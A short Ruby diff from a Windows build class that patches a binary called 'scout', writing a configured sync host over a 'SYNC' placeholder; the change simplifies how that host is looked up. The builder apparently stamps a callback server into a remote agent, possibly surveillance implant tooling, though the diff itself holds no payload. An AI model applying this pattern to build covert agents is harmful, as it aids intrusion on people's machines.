@@ -42,18 +42,9 @@ class BuildWindows < Build
       super
       patch_file(:file => 'scout') do |content|
         begin
-          config = JSON.parse(@factory.configs.first.config)
-          host = ""
-          # search for the first sync action and take the sync address
-          config['actions'].each do |action|
-            action['subactions'].each do |sub|
-              if sub['action'] == 'synchronize'
-                host = sub['host'].ljust(64, "\x00")
-                break
-              end
-            end
-          end
-          content.binary_patch 'SYNC'*16, host
+          host = @factory.configs.first.sync_host
+          raise "Sync host not found" unless host
+          content.binary_patch 'SYNC'*16, host.ljust(64, "\x00")
         rescue
           raise "Sync marker not found"
         end
